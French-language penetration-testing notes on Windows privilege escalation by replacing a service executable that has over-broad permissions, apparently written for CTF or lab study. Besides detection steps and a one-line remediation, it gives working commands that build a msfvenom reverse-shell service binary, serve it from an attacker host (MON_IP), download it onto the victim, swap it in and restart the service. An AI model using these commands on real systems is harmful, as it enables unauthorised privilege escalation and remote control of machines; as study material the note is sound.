---
technique: "Insecure Permissions on Service Executable"
os: Windows
categorie: PrivEsc
tags: [technique, privesc, windows, services]
rooms: []
---

# Insecure Permissions on Service Executable

## Principe
> Le SCM (Service Control Manager) lance l'exécutable (`BINARY_PATH_NAME`) d'un service sous un compte donné (`SERVICE_START_NAME`). Si **l'exécutable** a des permissions trop larges (groupe `Everyone` en Modify), on le remplace par notre payload → il s'exécute avec les privilèges du compte du service.

## Détection
```cmd
sc qc <service>                                 :: config du service
icacls C:\chemin\vers\service.exe               :: permissions de l'exe
:: chercher Everyone:(M) ou (F)
```

## Exploitation
```bash
# Kali : générer le payload exe-service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MON_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server          # servir le payload
nc -lvp 4445                     # listener
```
```powershell
# Windows : récupérer et remplacer l'exe
wget http://MON_IP:8000/rev-svc.exe -O rev-svc.exe
move WService.exe WService.exe.bkp
move rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
```
```cmd
:: Redémarrer le service (sc.exe en PowerShell !)
sc stop <service>
sc start <service>
```
→ reverse shell avec les privilèges du compte du service (ex. svcusr1).

## Note
> En PowerShell, `sc` est un alias de `Set-Content` → utiliser **`sc.exe`**.

## Remédiation
- Permissions strictes sur les exécutables de service (pas de Modify pour Users/Everyone).
